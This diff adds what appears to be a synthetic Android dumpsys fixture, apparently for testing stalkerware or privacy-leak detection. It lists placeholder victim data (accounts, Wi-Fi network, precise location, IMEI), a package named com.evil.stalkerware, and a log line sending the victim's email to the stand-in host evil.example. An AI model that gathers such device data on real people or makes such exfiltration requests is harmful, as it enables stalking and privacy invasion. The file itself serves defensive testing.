@@ -1,0 +1,31 @@
+DUMP OF SERVICE account:
+Account {name=victim.user@corp.example.com, type=com.google}
+Account {name=alt%40mail.example.org, type=com.google}
+
+DUMP OF SERVICE user:
+UserInfo{0:Alice Victim:13}
+Owner name: Alice Victim
+
+DUMP OF SERVICE wifi:
+SSID: "Victim Family WiFi"
+BSSID: aa:bb:cc:dd:ee:ff
+scan: 11:22:33:44:55:66  Victim Family WiFi
+
+DUMP OF SERVICE location:
+{fused, 52.392128,4.902320±14.69m, Bundle[{}]}
+
+DUMP OF SERVICE bluetooth_manager:
+name: "Anthony's AirPods"
+address: de:ad:be:ef:00:01
+
+DUMP OF SERVICE iphonesubinfo:
+IMEI: 490154203237518
+
+DUMP OF SERVICE package:
+Package [com.android.settings]
+Package [com.evil.stalkerware]
+installerPackageName=com.android.vending
+
+SYSTEM LOG:
+E sync: failed for victim.user@corp.example.com token=abc
+E http: GET https://evil.example/path?user=victim.user%40corp.example.com
